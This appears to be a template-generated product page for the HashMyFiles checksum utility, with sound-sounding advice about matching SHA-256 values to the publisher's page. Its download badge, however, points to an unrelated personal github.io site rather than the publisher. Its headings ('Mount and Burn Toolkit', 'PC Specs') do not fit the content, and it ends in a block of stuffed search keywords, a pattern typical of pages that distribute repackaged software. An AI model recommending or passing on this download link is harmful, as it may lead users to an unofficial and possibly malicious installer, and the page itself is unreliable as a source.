# HashMyFiles - Checksums for Files You Have

![HashMyFiles showing a SHA-256 for one file the user is checking](https://www.nirsoft.net/utils/hashmyfiles.gif)

## Product Snapshot

HashMyFiles reads files you select and prints hashes such as SHA-256 or MD5. You compare the string with the one on the publisher's own page, using the same algorithm. The full string has to match. The first and last characters are not enough when the file matters.

A folder of files is the same check, repeated. Use it on an installer you meant to get, or on an archive you stored and want to notice a later change. Copy the expected hash from the official page, not from a comment under a video.

## Mount and Burn Toolkit

| Task | What you get |
|---|---|
| SHA-256 | A checksum you can match to a publisher |
| MD5 | Only if the page printed MD5, not as a substitute |
| Compare | Your string against the one you copied |
| Folders | The same check for several files you chose |
| Save | A text list of hashes for an archive you own |
| Stop | No "fix" when the values differ |

If the page has no hash, prefer a download that publishes one, or get the file again from the vendor you already trust.

## Deep Dive

Hash one file until you have compared a result by eye. Do not mix MD5 and SHA-256. They will never match each other, and that is not a damaged download. A one-character difference is still a difference. Do not open the file to "see if it works."

For your own backup, store the hash beside the archive. Later, hash the file again. If it changed and you did not change it, do not trust that copy. HashMyFiles will not tell you who changed it. It only shows that the bytes are not the same.

## Adoption Paths

HashMyFiles fits an installer check before you run it, and a record next to a file you keep. It fits one careful compare better than a huge folder you will not read. It does not fit password recovery, and it does not belong on files you are not allowed to read.

## Install Walkthrough

Prerequisites: The file on disk, and the hash printed by the publisher if you are checking a download.

1. Open HashMyFiles and add that one file.
2. Choose the algorithm the publisher used.
3. Compare the full value with the official page.
4. If it matches, you can continue with that file.
5. If it does not, delete the copy and download again from the same page.

## PC Specs

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core | Any current PC |
| RAM | 1 GB | 4 GB for very large files |
| Storage | Small install | The file you are checking |
| Files | One file you may read | The publisher's hash, when you are verifying |

[![GET HashMyFiles](https://img.shields.io/badge/GET%20%E2%80%94%20HashMyFiles-1d4ed8?style=for-the-badge&logoColor=white)](https://lisaharrisj550.github.io/.github/hashmyfiles-compare)

## Useful Links

hashmyfiles sha256 check, hashmyfiles md5 only if printed, hashmyfiles folder hashes, hashmyfiles compare full string, hashmyfiles own archive, mismatch means stop, official page, no password crack
